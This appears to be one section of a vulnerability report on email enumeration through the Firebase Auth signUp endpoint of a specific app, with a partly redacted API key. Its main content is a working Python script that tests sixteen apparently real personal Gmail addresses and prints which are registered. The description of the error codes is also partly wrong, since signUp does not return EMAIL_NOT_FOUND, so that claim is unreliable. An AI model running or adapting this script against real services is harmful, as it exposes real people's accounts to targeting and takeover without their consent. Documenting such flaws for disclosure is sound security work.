## 5. FIREBASE AUTH EMAIL ENUMERATION

### Vulnerability
Firebase Auth `signUp` endpoint returns different error messages for existing
vs non-existing emails:
- `EMAIL_EXISTS` — email is registered
- `EMAIL_NOT_FOUND` — email not registered

### Endpoint
```
POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyBPi[REDACTED]
```

### Payload
```json
{"email": "target@gmail.com", "password": "Test1234!@#$%", "returnSecureToken": true}
```

# EXECUTION TRACE
```python
import requests

KEY = "AIzaSyBPi[REDACTED]"
emails = [
    "void28119@gmail.com", "dintafahreza@gmail.com", "nanase@gmail.com",
    "dvvanime@gmail.com", "error404@gmail.com", "rikka@gmail.com",
    "ryuu@gmail.com", "slax@gmail.com", "sultanmerangin@gmail.com",
    "kenalinrock@gmail.com", "mdilah@gmail.com", "cathzy@gmail.com",
    "rohaizal@gmail.com", "revanwira@gmail.com", "bagusmaull78@gmail.com",
    "yanzz@gmail.com",
]

for email in emails:
    r = requests.post(
        f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={KEY}",
        json={"email": email, "password": "Test1234!@#$%", "returnSecureToken": True}
    )
    if r.status_code != 200 and "EMAIL_EXISTS" in r.text:
        print(f"REGISTERED: {email}")
```

